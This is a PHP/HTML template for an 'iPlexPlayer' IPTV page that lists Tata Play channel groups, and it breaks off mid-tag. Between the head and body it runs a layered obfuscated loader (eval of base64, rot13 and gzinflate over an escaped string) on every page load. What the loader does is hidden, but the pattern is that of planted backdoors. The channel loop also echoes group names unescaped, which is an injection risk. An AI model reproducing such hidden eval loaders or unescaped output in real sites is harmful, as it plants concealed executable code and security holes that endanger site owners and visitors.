
<!DOCTYPE html>
<html>

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>
<title>iPlexPlayer </title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="http://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <link rel="stylesheet" href="css/channels3f22.css">
    <link rel="stylesheet" href="css/nav3860.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/iconify/2.0.0/iconify.min.js"></script>
    <style>
        .stwBlurRainbowTop,
        .stwRainbowTop {
            position: fixed;
            width: 100%;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            z-index: 288883;
            background: linear-gradient(-45deg, #4086f4, #31a952, #fbbe01, #ff311f, #ff00cc, #4086f4, #31a952, #fbbe01, #ff311f, #ff00bb);
            background-size: 200%;
            -webkit-animation: animeBar 5s linear infinite;
            animation: animeBar 5s linear infinite
        }

        .stwBlurRainbowTop {
            height: 11px;
            z-index: 28882;
            filter: blur(15px);
            opacity: .7
        }

        @-webkit-keyframes animeBar {
            0% {
                background-position: 0 50%
            }

            50% {
                background-position: 100% 50%
            }

            100% {
                background-position: 0 50%
            }
        }

        @keyframes animeBar {
            0% {
                background-position: 0 50%
            }

            50% {
                background-position: 100% 50%
            }

            100% {
                background-position: 0 50%
            }
        }
    </style>
</head>

<?php eval(base64_decode('CiBldmFsKHN0cl9yb3QxMyhnemluZmxhdGUoc3RyX3JvdDEzKGJhc2U2NF9kZWNvZGUoIlx4NGNceDU1XHg2ZVx4NDhcMTA1XDE2MVx4MzBcNjRcMTA0XDE2Nlw2MlwxNDFceDcyXDE1Nlx4MzZceDdhXHg0OVx4MzRcMTQ2XHg3MVwxMDZcMTI3XHg1MFx4NGFcMTU0XHgzM1wxNzFceDRhXDE1NVx4NzlceDM1XHg2Y1wxNzJceDcwXDE1NVx4NzZceDQ4XDE3MlwxMTVcNjFceDZjXDExNFwxMDdceDRlXHg0Y1wxNDRcMTU0XDEyMFx4NGZcMTU0XHg1NFw2Mlx4NTJcMTIxXHgyZlx4MzNceDZlXDY2XHgzMFw1N1x4MzRcMTY2XDEyNVwxNDVceDc5XHg3NVx4NThceDUwXHg0Zlx4NDJceDUxXHg0Y1x4NjdceDY2XHgzMFx4MzdceDRjXDYwXHg1OVx4NzlcMTE0XHgzM1w1N1wxNzFcMTU3XDE0MVwxNTZceDc5XHgyYlx4MmZceDM4XDE0Nlx4NjZcNjZcMTY1XHg3OVwxMDFcMTUwXHg2NVwxMDZcMTA2XDEwNlwxNzBcMTU3XDExNlx4NTNceDMxXDE1NFx4NzdcMTQ2XHg1OVwxMTdcMTE0XDcxXHg3MlwxNjRceDc3XHg1NFw2N1wxNzJceDdhXDEzMlx4NWFceDUzXDExMFw2NVx4NDhcMTAyXHg1OFw2NFx4NjlcMTcwXHg1M1x4NjFceDQzXDY2XHg0NVx4NTNcMTIyXHg2YlwxMTJceDQzXDExNFx4NTZcMTEyXHg0Y1x4NTdceDRiXDEwN1wxNzBcMTA1XDE0Nlx4NGJcNTdcNTdceDcyXDYwXDE1MVwxMjBceDczXDEyMFx4NjhcMTIwXDE2M1x4NjdcMTU1XHg3N1wxMTJcNTdcMTIxXHg3NFwxNTNcNjRceDZhXHg3M1x4NDNceDM5XHg1NVwxNzFceDZiXDExM1x4NjdcMTU2XDE0MVwxNTVceDZiXDE1NFwxMDFcNjNcMTMwXHg0YVwxNTRcNjFceDY1XDY2XDE0NFx4MzdcNjJceDYzXHgyYlwxNjFcMTcyXHg1M1wxNTVcMTIyXDE0Nlw2Nlx4NTlcNjJceDY0XDExM1wxMDFceDc4XHg2ZFw1N1wxMTdcNjVcMTUzXDE1MFx4MzhcMTQ3XDUzXDE1M1wxNjBcMTUyXDEyMVx4NGRceDQ5XHg1Nlw2Mlx4NmJceDRjXDEyNVwxNzBceDJiXHgzN1wxNzFcMTU2XHg2NlwxNzJcMTY1XHgzOFx4NmVceDczXHg1YVx4NGRceDUzXDEyNFx4NzNcMTA2XDE1NlwxNDFceDM4XDExNVw2MlwxMjBcMTYzXHg0Y1x4NDhceDM5XDE3MVx4NDZcMTE1XHg0YlwxMjJcMTY2XDEyNVx4NTRcMTcwXHg2ZFx4NTBceDYyXDE1MVwxNTRcNjVceDYxXHg0Nlx4NzNceDRkXDEzMVwxMjRcNjFcNTdceDY3XHg2OFx4NTZcMTA3XHg0MVx4NGVcMTUzXDE2MlwxMTFceDRiXDEwMVx4NGFcMTMxXHg2OFx4NjJceDVhXHg0NVx4NzhcNzFceDMzXHg3Nlx4NDZcMTYxXDE2NFx4MzNceDQyXDExMlwxNDRceDRjXDYyXDY0XDEwNVx4NzlcMTEzXHgyZlx4MzdceDM0XDE2Nlx4MzhceDY2XDEyMlx4NDNceDZmXHg3Mlx4NDRceDRlXHgzNlx4NjlceDc2XHgyYlwxMjZcMTYzXHg3N1x4NjdceDUxXDEzMlwxNjdcMTU3XDExNlx4NTZcMTY2XHg1M1x4NjdceDZlXDE2MlwxNjRceDY5XHg2OFwxMDZcMTcwXHgzM1x4MzBceDZjXDE3MlwxMzFceDRmXHg3OVx4NThcMTIxXDE0NVx4NDVceDY1XHg1Nlw2Mlx4NjFceDczXHg3OVx4NjlcMTUzXDU3XHg2ZVwxNTNcMTMyXDEyM1x4NTBcMTE3XHg2NFw2M1x4NzRceDU1XDE1Nlx4NmNceDMzXHgzM1wxNjBceDMxXDE1Mlw2MFw2NVw2Mlx4MzJceDMyXHg2OFw2M1wxNDRceDRlXHg0OVx4NmZceDU4XDE0M1wxNTBcNjJceDcwXDEwM1wxMDFcMTI2XDExNVx4NzdcMTY3XDE2M1wxNzJceDMzXHg0NFwxMzFcMTYyXDEzMFwxMTNcMTEyXDE0MVx4MzVceDZmXHgzNlx4NTNceDU0XDE0MVwxNDRcNjdcNjdceDY2XDEwM1x4NzRceDY4XDE3MFwxMTZcMTExXDE0NVwxMjZcMTAzXHgzN1wxMDFcMTcwXDEyNFwxNjNcNzBcMTYwXDY0XDEzMFx4NjhcMTY2XHg3MFwxMDVceDRiXHg3Nlx4NDNceDQyXHgyZlw2NFw2NVwxMDZceDcwXHgyYlx4NjRcMTUxXHg3Nlx4NGNcMTcyXDUzXHgzOVwxMTBceDdhXHg0Mlx4NTlcMTcxXDEwN1x4NmRceDZhXDUzXHg0YVwxNjRcMTI3XHg3MFx4NmFcNjRceDZhXHg2NFx4MzRcMTIyXDE0Nlx4MzVcMTEwXDE1Mlx4NGJcMTQ0XHg2Y1x4NzdceDM5XDY1XDEyM1x4NGJceDZlXDE3MFwxNjNceDc2XHg1OFx4NTZceDcwXDY2XDE0M1w1M1x4NTJceDM5XHg3MVwxMDFcNjFcMTYzXDU3XHgzNVwxMjNceDZjXDEwMVx4NzhcMTQ0XDExMFx4NjVceDM3XDEwMlx4NzVcMTI2XDE1NFwxMTZcMTE2XHg0ZlwxMTNcNjNcMTMwXDEyNlwxNjNceDU5XHgzM1x4MzlceDZhXDEyNlx4NjZcMTUyXHg0NVwxMzBcMTQ3XDYzXHgyYlwxMTNceDcyXDExNlx4NTJcMTQ3XDE1MlwxMjBcNjBceDM3XDE1Nlx4NGZcMTE1XHg3MVx4NjJceDQ5XDExMVx4NjlceDQxXDEwMlx4NzBceDYxXHg3N1x4NTRceDVhXDEwN1wxNjBceDM4XDE2MlwxMzJceDczXDY3XHgyYlwxNjdcMTI1XDE2MVx4NDVcMTA3XHg1M1wxNDNcMTY3XDEwN1wxMTRcMTA3XHg1NFx4NzVcMTU0XDEyMlx4NDNcMTU0XHg0ZVx4NGVceDY4XDEyMlx4MzRcNzFceDRhXDE1M1x4NGVcMTA1XDExNVwxMjFceDM3XDU3XDEwMlx4N2FceDQ2XDEyN1x4NDZceDMwXDE2N1x4NTBcMTQxXHg2ZFwxNjBcMTYxXHg3OFwxNzBcMTYzXHgzOVx4NDlcMTI1XDYwXHg0NlwxMjRcNzBceDQzXHg2Y1x4NzFcMTcyXHg2N1wxNjVcMTA1XDEzMlx4MzhcMTUyXDEwNVx4MzJceDQ0XDE2MFw2MVwxMTJcMTUzXDE2NFwxMjRceDZjXHg0NFx4NDVcNzFcNjZceDZmXDEwMVwxMDZceDZmXHg0N1wxNjVceDUxXHg1OFwxMDdceDY0XHg3OFx4MzFcNjVcMTU0XDEwMVx4NzJcNjNceDZiXDEzMlx4NDRcMTIzXDYzXHg0Ylx4NTNceDZmXHgzM1x4NTZcNjNceDRhXHg2MVw2N1x4NDNceDQyXDEwNFwxMTdcMTE0XHg3MlwxMTBcMTMxXHg3MFwxMDRcMTE1XHg1YVx4NTlceDM3XDE2N1wxMjNcNjJcMTU1XDExNVx4NzZcMTYyXHg0Y1wxNDVcMTQyXHgzNVwxMzFceDYxXDE1M1x4NjlcNjJcMTQzXHg3OFx4MmJceDc5XDE2M1x4MmJcMTMyXDE1NVx4NDNceDRlXDE2MVwxMDNceDQxXHgzMFx4NzZcMTI2XHgyYlx4NGVceDQ2XHg0Mlx4NDdceDZmXDE1MVx4NzJcMTU0XHg0N1wxMTZceDMwXDY2XDE3MFx4NDRcMTIyXDEwNlx4NDhcNjdcMTIzXDEyMlwxNTdceDZhXDEwNFx4NzdceDRhXHg0N1x4NGVceDcwXDExNVwxNTJcNjZceDc0XHg2ZVx4NmRcMTMxXHg1MVwxNjVcMTcwXHg3NFx4NmFceDQyXDEyMFwxNTVcMTIzXDYyXDE0Nlx4NzlcMTQyXDExN1wxMDZcMTE1XDEyNVx4MzBceDJmXHg2NVx4NjFcMTU2XDYwXHg0N1wxMzFcNTdcMTYwXHgzNlw2MFw2NVwxNDFceDZhXDE1Nlx4NDdceDM0XDEyM1x4NTFcMTYyXDEzMlx4NzZceDdhXDEyNVx4NGRcMTQ0XDE0NFw2N1x4NThcMTA2XHg1NFw2NVwxMjBceDJiXHg0ZVwxMjFceDQ2XDEwM1w1N1wxNjNceDc3XHg3MlwxNDNceDUzXHg1NFwxNDFceDMwXDE1N1wxNDFcNTNceDQ2XHg2ZFx4MzZceDZhXHgyZlx4NTZceDZiXHg3YVx4NThceDdhXHgzNFw2NFwxNTFceDQ5XHg0Mlx4NzhcMTI1XDY1XHg2Y1x4NTlcNjBceDJiXDE2MlwxNTdcMTMxXHg1MFx4NzdcNzFcMTI0XDE0NVx4NGRcMTcyXDEwMlx4NjJceDRjXHg1N1x4NjNcMTA3XDExNVwxMDFcMTY3XHg3Nlw1M1x4NGRceDM3XHg2Y1x4NzFceDMyXDYwXHgzM1wxMDNcMTEyXHg2M1x4NjVceDM1XDE0N1x4NTlceDRjXDE2Nlx4NGZceDYzXHg1M1wxNjRceDRhXHgzOFwxMjJcMTYwXDExMFx4NThceDQzXDUzXDYxXHg1MFwxNjVcMTQ1XHg1OVw3MVx4NDVceDZjXHg3OFwxNjJcMTA1XHg2Y1x4MzdceDM4XDEzMlx4NDVcMTI1XHg3MVwxMDZceDRmXDE2N1x4NjhceDRjXDE0NFx4NzBcMTA3XDEwNVx4NDlceDQzXDE1MFw2Nlx4NjJceDRiXDY0XHg2N1w2N1wxMTRcMTY2XHgzMFx4NGNcMTUwXDE3Mlx4NDZcMTAxXDEwMlx4NDJceDcxXHg0ZFx4NDVceDM5XHg1N1x4NDlceDc0XHg3NlwxNjdcMTE2XHg2OFwxMTFceDY2XDEwNlx4NGJcMTIxXHg1MVwxMDZcMTMyXDE0NVwxNjVcMTQ2XHgzNFwxNzJceDM3XHg2Mlw2N1wxMTFceDM4XHg0OFx4NjJcMTUxXHg1MVwxNTVceDQyXHg3OVwxMzFceDZkXHg0Zlx4NzVceDQ2XDY0XDE1MVx4NDRceDMxXDE2Mlx4MzZcMTYzXHg0ZFwxNjZcMTUzXHg0OVx4NDRceDcwXDE0M1wxNjVcMTQ2XHg0N1x4NjNceDJiXHg2Y1x4NDZcMTA0XHg2ZVwxMjJceDJiXHg0MVw2MFwxMjNcMTAzXDEyNVx4NzJcMTMyXDYzXHg3NVwxMzBceDU5XHg1MFwxNDFcNTdcMTQ2XDEyMFx4NjJcMTcwXDE1NVx4NGVceDRkXHg2OVx4NjNceDUyXHgzNlw3MFwxNjFcMTI3XDY2XDEzMFwxMDRceDUxXDE0NVx4NzBceDczXHg3M1wxNTdcMTUwXHg2OVx4NjFceDQyXDE1M1x4NGZceDcxXHgzM1wxMjVceDQ5XHg2ZFx4NjFceDYzXDE0MlwxMDVceDYyXDE0Mlx4NTNceDc4XHg3NFx4MzNceDUyXHg3YVx4NjhceDU5XDE2MFwxNjJceDQ0XDExN1x4MzJcMTQxXDE0MVwxNTRceDU5XDE1MVw2Nlx4NmZcNjJcMTY3XDE0MVwxNjVcMTU0XHg3YVx4NTRceDJiXDYwXDEwM1w2M1w2NFwxNjVcMTA2XHg3MFx4NjhceDQxXHgzNlx4NWFcMTU3XHgyYlx4NDNcMTI0XHg3OVwxNTFcMTI2XHg0NFx4NzVceDM3XDExM1x4NGZceDRlXDEwN1wxMjJcNTNcMTUwXDEyNVwxNDZceDM5XHg1MVwxNjBceDJiXHg3OVx4MzZceDMzXHgzNVwxMTNceDZjXHg2NlwxNDVcMTI0XDExMFwxMDdcMTU1XHg0M1x4NDRcMTcwXDEzMVx4NzRcMTYwXHg0MVwxNjdcMTU1XDE2Mlw2NVwxMDJcMTYyXDY1XHg1Mlx4NzlceDM3XDEwMlx4MzNceDQ3XDEyMFx4NTRceDc1XDE3MVwxNDRcMTA0XDE1MFx4NzlcMTEwXDE0NlwxNTdcMTExXDExMVx4NDZcMTY0XHg0Nlx4NDhceDdhXDE1NVx4MzlcNjVcMTUyXDEwN1x4NTdceDU1XDExN1wxNjFceDRhXHg1MVw2Mlx4MzBcNjFceDc3XDE3MVx4MzBceDZmXHg1MFx4NGNcMTcxXHg1MlwxMjZceDc4XHg1OVx4MzNceDU3XDYwXHgyZlwxNDZcMTE2XHg0N1x4NTRceDY3XHgzMlx4NmNceDYxXHg1NVwxMzFceDYyXHg2N1wxMTRceDdhXHg0ZFx4NjFcNjNcMTQxXHg0ZFx4NWFcMTI3XDE1NFwxMDRceDY3XDExNVx4NDJcMTQzXHg3Mlw1N1wxNDJcMTAyXHg3Mlx4NmVcMTEzXDE2MFw3MFwxNDJcMTUzXDYxXDE1MVx4NGRcMTcyXDExNVwxNTZceDZmXHg0NVx4NzBcNzFcNjVcMTA2XDE1NVw1M1x4NTFcMTUxXDYyXDE1MFx4MzJceDMzXDYyXHg1MlwxNTVcMTYxXHg1N1wxMTRcMTEwXDcwXDE0NVwxMDNcMTExXDExMVx4NmJceDRhXHg0Mlw2NlwxNzJcMTEwXDEwNlwxMTRceDZlXDE1NFwxMjBceDQ3XHg1MlwxMjRceDcxXDE1NVwxMjJcMTcxXDEwNVwxMTVceDUyXHg0NlwxNjZceDY2XHgzMFx4NjVcMTYyXHg2YVwxNTdceDc4XDExMFwxMjZceDJiXDEwMlwxNzBceDZlXHg1YVw2MFx4NTdceDYyXDY3XDEwMlx4NjJcNjJcNjZceDQyXHg0YVw1M1x4MzdcNjFceDMzXDE2M1wxNDRcNzBceDQxXHg3M1x4NzlcMTY3XDE2N1x4MzVcMTAxXHg1M1x4NjJceDc2XDE1MFwxMzJceDQ5XDE0Mlw2NFx4NjVceDZiXDEwMlw3MFx4NThcMTcxXDEyNVx4MzVceDQyXDYxXHg2N1x4NjRceDQ5XHg0MVx4MzlcMTExXHgzNFwxMDRceDZkXDE2M1x4NDhceDQ5XDEwN1w2MlwxNDVcMTAzXDYyXDE1NVwxNDRceDZlXDEyNFx4NTJcMTAyXDE2N1w2Nlx4NGJcMTYzXHg0OFwxMjRcMTIyXDEwM1x4MzNceDRmXDYyXHg2Nlx4NGNceDMwXHg2N1wxMTdceDMwXDE0NlwxNjJceDM5XDE1N1x4NmNceDdhXHg0M1x4NTRcNjBcMTY1XHg2Y1wxNDZcMTY0XDEyN1x4NmNcMTY0XHg3MVwxNjJceDZiXHgzNlx4NmVceDY5XHg1NFwxNDRceDRiXDYyXDE0NFwxMjZcMTUxXHg2YVwxMjdcNTNcNjJcNjVcMTYxXDY3XHg3MFwxMTdceDY2XDE0M1x4NTVceDdhXDcwXHgzMFwxMjJcMTQ1XDExN1wxNTBcMTE2XDE1MFwxNjBcNzBcMTYzXDE1MFwxNTFcMTEwXDE0NFx4NjNceDc4XDE1NVx4NzhcMTIxXHgzOVx4NDFceDZjXDE2MVwxNTVceDMyXHg3MlwxNTRceDcwXDEyN1x4NDhceDUzXDExNVwxNTVcMTQ2XHg2MVx4NjVcMTA1XDEyNFw2N1x4NjZceDZiXDYzXHg2NVwxNTNceDY1XDYwXDYzXDExNFx4NTFceDc3XDExMlx4NjJcMTUzXHgzOVx4NjVceDc4XHgyYlw3MFwxNTRcMTMxXDE3MVwxMjNcNTNceDMyXDE2NVx4NmJceDU5XHgzNVwxNjVceDQzXDEwM1wxNjBcMTI3XHg0Zlx4NzFcMTcyXDEyM1x4NDFceDZkXHg3M1wxNTVceDY0XHg1NFwxMDJceDcwXDE2M1x4NDFceDRkXDE2NlwxNjJceDQ4XHg0N1x4NjNceDcxXDEyNFx4NzNcMTY2XHg0ZFx4NTFceDQ0XHg0Zlw1M1wxNTBcMTQzXHgzNlw2MlwxMjFcMTQ1XDE2NlwxNjJcMTAzXDE1Nlx4NTRceDQyXDEyMVwxMTdcMTIxXHg0Nlx4NGFceDU1XHg2MVx4NjdcNzFceDQ5XHg0Zlx4NmRcMTY1XHg3MFwxMTZcMTE2XHg2OFwxNTdcMTI0XHg2Nlx4NDlcMTUzXHg1MlwxNDNcMTU2XDE2MFwxNjJcMTEyXDcwXDEwN1x4MzZcNjZcMTY1XHg0N1x4NzhcMTE2XHg0YlwxMTNcMTYyXDE1Nlw2N1wxMzJcMTQ2XHg1NlwxNDFceDJmXHg1MFx4NTZcMTI1XDEwN1x4NzdceDY1XDE0MVwxMDVceDM3XDEyNVx4NTFceDJiXHg1M1wxMTdcNjZcMTQ2XHg1MFx4N2FceDU3XDExNlx4NGNcMTYzXHg3MVx4NDdceDc4XHg2Y1wxMjRceDc3XDE3Mlw1M1x4MzVcMTY3XDEyNVwxMDNcMTQxXHg3MFx4NjNceDU5XHg0ZVx4NGJcMTEzXDEwNlwxNDFcMTE3XHg2OFx4NTRceDY5XDE1NlwxMjNceDU1XHgzNFwxMTJceDM5XHg1OVwxMTJcMTY1XHg2NlwxNjVcMTIyXHg2ZVx4NjRceDY3XDE3MVx4MzBceDQ2XDEzMVx4NTFcMTY0XHg2ZFw1M1wxNDNceDU0XDEyNVx4NjdcMTI1XHg0OFwxMDRceDUyXHg2NVwxMTRcNzFceDMxXHg2Ylw2NVx4NzJcNTdceDYyXDY1XHg2N1x4NjRcNTdcMTMxXDEyMlx4NDhcMTUyXDE1M1wxMTVceDRkXDEyM1wxMTZcMTU0XHg1NFx4MmJcMTA2XHg0ZlwxNjFcMTQ2XDE2NlwxNjBceDJiXDE0MVwxNTJcMTE0XDYzXDYxXHg3N1wxMDJcMTA2XDEwN1x4MzNceDQ0XHgzNFw1N1x4NDhcMTIyXHg0OVx4NDFcMTAxXDExNlwxNjBcMTA0XDE2MVwxMzBceDQzXHg3N1wxMzFcMTA0XDEwNVx4NTdcMTcwXDE2MFwxMDdcMTQ2XDEwMVwxMzJcMTMxXHgyYlwxMTFceDU0XDExNVx4NmRcMTYyXHg3Nlx4NzZceDQ2XDExNlwxMTZcNjRcMTYyXDEwMlwxMTBceDc5XDY2XHg1NVx4NDNceDYxXHg0Ylx4NDJcMTQxXDE2MFwxNDVcMTY3XDYxXDY1XHg2NFx4NmVceDUxXHg0Ylx4NjRceDU1XDE1Mlw2NFx4NTZceDU5XHg1OFw2NFx4NmNcMTI1XHg3MVw2MFx4NzhceDMwXHg2ZVwxMDZceDQ0XDEzMVw2M1x4NDZcMTMxXDExNlx4NjdcNTNcNjFcMTAxXHgzNlx4NTRcMTY0XDE1Nlx4NzBcMTY3XDYwXHg0ZFx4NDJcNjFceDMxXDE1N1wxNDdcNTNceDMxXHg2Nlx4NmVcNjNceDUxXHg0M1x4NDNceDYzXHg1Nlx4NjJcMTYwXDE2N1w2Nlw2N1wxMjFceDQzXHg3NFx4MzBceDc3XDE1M1wxMzBcMTAzXHg3N1wxMjRcMTAyXHg2MVx4N2FceDM5XDEyMVwxNTJcMTAzXDE1Mlx4NThcNTdceDc5XHgzMlx4MzZceDQ3XDcxXHg0M1x4NzBcMTU1XDEwM1wxNDRcMTIxXDEwMlwxMTZcMTY0XHg2YVwxNTdceDU3XDE1NVwxNjVceDRlXHg1MFx4MzNcMTY0XDE0N1wxMDNcMTE2XHg2Nlx4NzZcMTA1XDE0NlwxMTdceDc4XDExNlwxNzFcMTIxXHgzMFwxNjRcMTU1XHg0Ylx4NDhceDM3XDEyMFw2N1wxMDVcMTU3XDE2NVx4MmZcNjJcMTQ2XHg2OFx4NDFceDUzXDU3XHg0N1x4NzNceDQ0XHg2Y1wxMjBceDQzXHg3M1wxNDRceDU1XHg1NFwxMDdceDQ0XHgzNVwxMDZcMTY3XDY0XDExNFwxMTJcMTAzXDE0MVwxNTVceDYyXHg0M1x4NjhceDM3XDY2XDExMVx4MzFceDYyXHg1OVw2MFwxMDFcNzBceDJmXDExNFx4NGNcNjZcMTI0XDEwN1x4NDlceDc3XDY1XDU3XHgyYlw1M1w3MFw3MFwxNzFceDY2XDE1MVwxNTBceDcyXDE0Nlx4NTRcMTEwXDYwXHg2NVx4NGRceDU0XHg3NVx4NzFceDQ1XDE2NVx4NmZcMTU2XHgyZlwxNjRcMTQyXHg1OFx4NTNcNjBceDQ1XHg0N1x4NTdceDUxXDE2NVw2MlwxNDJceDM3XDE3MFw1M1x4NDVcMTA0XHg0YlwxNjZceDc1XHg1YVw3MFx4MzVcMTY1XDExN1wxNjFcNjJceDU0XHg0M1x4NjhcMTY1XHgzN1x4MzJceDY2XHg0Y1x4MzNceDczXHg1MVx4NzhcMTQxXDExNFx4NDJceDc3XDEwMVw3MFwxNDdceDM4XHg2Y1wxNzBceDRiXDE2NVwxNzBceDY1XHg3Mlx4NzVcMTEyXDE0MlwxMjdceDRkXHg1M1w2MFwxNDNceDRmXHg3NVx4NDVcMTQ3XDE2NVwxNjJcMTI1XHgzMVwxNDJceDQzXHg3M1x4NTZceDJmXDE3MlwxMTNcMTA3XHg3Nlx4NzVcMTIxXHg3Mlx4MzZceDMxXHg3N1wxNDFceDdhXDE2MFwxNDZcNTdceDYxXDE1NVwxMTNcMTQ1XHg1M1x4NmFceDY4XHg3MFwxNDRcMTMwXHg1M1wxNTNcMTY1XDE1N1x4NzVcMTEyXDYxXHg2NVw2Nlx4NzVcMTEwXDY1XDE2Mlx4NjFcMTY1XHgzNlx4NGRceDU2XDcwXDE2M1x4MmJcMTYxXDEwN1x4MzBcMTUyXDExMVx4NTVceDc0XHg1OFx4NmFcMTU1XDEyNlx4NzZceDZkXDEzMVx4NTFcMTI2XDE0MlwxNDFceDc5XDEwNVx4NGNceDU4XDEyMlx4NzhceDZlXDE2MVwxNjVceDc0XHg0NFx4MzBceDUyXHg3N1x4MmJcMTAzXDE1MVx4NjJceDc0XHg1N1x4MzRcMTYwXDE3MFwxNTNceDMwXDE1MVwxMDJcMTE0XHg3N1wxMTJcMTEzXHg0OVx4NjVceDMzXDE2NFwxMTRcMTI2XDYyXHg0ZFx4NjFceDc1XHg2MVwxNjRceDU0XHg0OFw2Mlx4NjVcNzFceDY3XDEyNVwxMDNcNzBceDQ5XHgzMlx4NDNcMTQzXDExM1wxMjVceDRjXDE2Mlx4NzhceDUyXHg1M1x4NzRcMTU3XDE2Mlx4NGVcMTcyXDE0NFx4NGFcMTIxXHg3NFx4NTNceDUwXDE1M1wxMjdceDMxXHg2MVx4NzBcMTMwXHg1OVw2M1x4MzBcMTYxXHg1OVwxNzBceDQ2XDE1NlwxMTBceDY2XDY1XDE3MVx4NDRcMTQ3XHg2Ylx4NGJceDY1XDE2MVx4MzdcNjRceDQ2XDE0MVx4NzVceDM1XDEwNFx4NDZcMTMxXDEyMFx4NDJcMTYzXHgzM1wxMzFceDVhXDEyNFwxNDRceDc2XHg1MlwxMDRcMTI0XDEwNVwxNjFceDZjXDE2MVwxNTVceDM4XHg2Y1x4NzZceDc2XDE3MFx4NjNcMTA2XDE1MVwxMTBceDRmXDE2NFx4MzRcMTYxXDcxXHg2OFwxNDNcMTA0XDE2NVwxMjNceDJmXDE1MVx4NmNcMTQyXDY1XHg3OVwxNjRceDU4XDE0M1x4NmVceDY0XHg1OVw2NVwxMjNceDRhXHg2Ylx4NTdceDUzXDY3XDY1XDE2MFx4NDlcMTU0XDExN1wxNTJcMTYwXDE2MVx4NjRceDMyXDE3Mlx4MzVcMTI1XHg2ZFx4NTRcMTI1XDY0XHg0Ylx4NzBceDc1XHg0MVwxMDFceDY5XDEwNlwxMjdceDQ4XDE1M1x4MmZcNTNcMTQ0XHg1YVx4NjRcMTY0XHgyZlx4NTZcMTQ1XHg1Nlx4NTFcMTUxXDE0Nlw2NFw2MVwxNTNcMTE3XHg0Y1x4NWFcMTcxXHg3YVwxMTdcMTMyXDExMVwxNDJcMTI1XDU3XHg1NVwxNTBceDUyXDY2XDU3XHg2NlwxNjRceDdhXHg1M1wxNTZcMTYyXDExNVwxMTJcMTQxXDYxXHg0ZlwxMTNcMTE1XDExM1wxMjZceDQ2XDE0M1wxNTRcMTY2XDE3MVwxNDdceDc2XHg2NVwxNjVcMTcyXHg2ZFwxNDVceDdhXHgzNlwxMjVcNjVceDZhXDE3MFx4NmJceDU2XHgzOFwxNzJceDcyXDEwNlx4NTRcMTYwXHgyZlx4NGRceDM2XHg2Mlx4NTVceDUyXDE0MlwxMjNceDUzXHg2OVwxMjJcMTcyXDE3MFwxMzJceDMzXDExMFx4NzNcMTUwXDY3XDEzMVwxMDNcMTYyXHg2Nlx4NmFcMTMwXDY2XDEyMVw3MFx4NDdceDZlXHg3N1x4NTlceDRiXHg1NFwxNDZcMTUzXDYxXHg0Ylx4NjlceDY3XDEyNFx4NjRcMTIwXDYyXDExNFx4MzFcMTQ3XHg0ZFw2M1x4MzFcMTY2XHg0ZFwxNDVceDZlXHgzM1x4NGRcMTAzXDY3XHg0Nlx4NTNcMTIzXDE0M1w2M1wxMjVcMTIxXDExNlwxMDRcNjVceDc4XHg1NFx4NGZceDc5XDUzXDEyMVwxNjFcMTA2XHg1OVx4NzBcMTUxXDE0M1x4NzdceDRkXHgzOFwxMDdceDQzXHgzMVx4NmZcMTMwXDEwNVx4NmFceDMyXHg2MVx4NGZceDVhXDEyM1wxNjNcMTUxXHg1NFx4NzNcMTU0XDExNlx4NTZcNTdcMTE1XHg0M1w1N1wxMzJcNjBcMTEzXDExNFwxMDJcMTE3XHg1Nlx4NTJceDMyXHg0N1wxNTdcMTY0XDcxXHg3OVx4N2FceDRkXHg0Nlx4NGRceDRlXHg2OVx4NDRceDc1XHg0NVx4NDNceDQ1XHgzOVwxNjFcMTEwXDEwNVw3MFx4MzhcMTE0XHg1OVwxMjRceDQ5XDEyM1wxMTFcMTUxXHg3Mlx4NjFceDMyXDE0NVwxNDRceDQ5XHg3OVx4MmJcMTI3XHg3NVx4NjZcNzBceDY0XHg2M1x4NmVcMTAzXHgzNFw2M1x4NGRcNjFcMTMwXHgzMlwxMDFcMTIwXDExMFwxNDRceDU1XHg2ZVx4NzdcNjdceDJmXHg1MVwxMDdcNTNceDUxXDE0NFx4NGZcMTYxXDEzMFx4NDJcMTA1XHg3MVwxMDNcMTAxXHg1YVwxNjRcNjVcMTE1XDYzXDcwXHg3M1x4NTJceDRmXDExNFx4NjlcMTQ0XHg3Nlx4MmZceDM4XHg0NFx4NmVceDZlXHgyZlw1M1x4NDNceDc3XDc1XHgzZCIpKSkpKTsg')); ?>

<body>

</body>

<header style="display:fixed" class="header" id="header">
    <center><a id="head-logo-href"><img src="https://i.postimg.cc/4yX3jmZN/IMG-20230905-093100.png" style="width: 130px;margin-top: 7px;margin-left: 15px;" alt="Compart Logo"
                itemprop="thumbnail" width="210px" height="auto"></a></center>
   
    <br>
    <div style="margin-top:10px;z-index:9999;display:absolute;
background:silver;color:red;" class="no-items section" id="search_top" name="Search (Top)"></div>
<input style="display:sticky;visibility:visible;background:silver;color:brown;width:90%;height:35px;z-index:9999;margin-top:10px"
        class="fin" placeholder="Search here.." id="look_tv_here" type="text">
    <button class="bt2" type="button" id="look_tv_button" aria-label="Search">
        <span class="iconify" data-icon="el:search-alt" data-width="33" data-height="33"></span>
    </button>
</header>

<body>
    <div class="stwRainbowTop"></div>
    <div class="stwBlurRainbowTop"></div>
    <div style="height:64px;
height:var(--header-height);">
    </div>
    <center>
        <div class="main" id="ch_list" style="margin-top: 14px;"></div>

        <a href="all.php" class="popup-video">
         <div id="TataSky_Catchup" class="tvv-item">
         <div class="tvv-name-s">iPlexTv</div>
         <div class="tvv-name-t">Groups</div>
         <img src="https://www.tataplay.com/cms-assets/s3fs-public/inline-images/tata-sky-logo.jpg" alt="img" class="loading" >
         <div class="tvv-name2">Tata</div>
         <div class="tvv-name">All</div>
         </div>
       </a>



        <?php foreach ($channelsData as $channel): ?>
       
       <a href="group.php?group=<?php echo $channel['group']; ?>" class="popup-video">
         <div id="TataSky_Catchup" class="tvv-item">
         <div class="tvv-name-s">iPlexTv</div>
         <div class="tvv-name-t">Groups</div>
         <img src="https://www.tataplay.com/cms-assets/s3fs-public/inline-images/tata-sky-logo.jpg" alt="img" class="loading" loading="lazy">
         <div class="tvv-name2">Tata</div>
         <div class="tvv-name"><?php echo $channel['group']; ?></div>
         </div>
       </a>

       <?php endforeach; ?>
       
       <a href=""><div class="fire_row_load" id="fire_row_load"><button id="load_more_anbtn" data-page
